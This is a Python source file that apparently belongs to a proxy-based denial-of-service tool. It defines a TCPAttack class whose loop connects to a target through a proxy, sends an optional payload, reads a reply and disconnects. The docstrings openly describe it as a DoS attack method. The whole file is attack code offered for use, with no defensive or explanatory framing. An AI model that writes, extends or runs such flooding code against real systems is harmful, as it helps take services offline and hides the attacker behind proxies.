from AttackMethod import AttackMethod


class TCPAttack(AttackMethod):
    """
        Most simple AttackMethod you can think of. Connects to the target, sends the payload (optional) and closes the
        connection again.
    """
    def __init__(self, proxy, target, payload=None):
        """
            Constructor

            :param proxy: Proxy object used by this attack method
            :param target: Target (Destination Object) of the DOS attack
            :param payload: Optional payload to send to the target (default= None)
        """
        AttackMethod.__init__(self, proxy, target)
        self._payload = payload

    def _attack_loop(self):
        """
            Attack loop of this attack. Gets called by parent.
        """
        self._proxy.connect(self._attack_target)
        self._proxy.send(self._payload)
        self._proxy.receive()
        self._proxy.close()
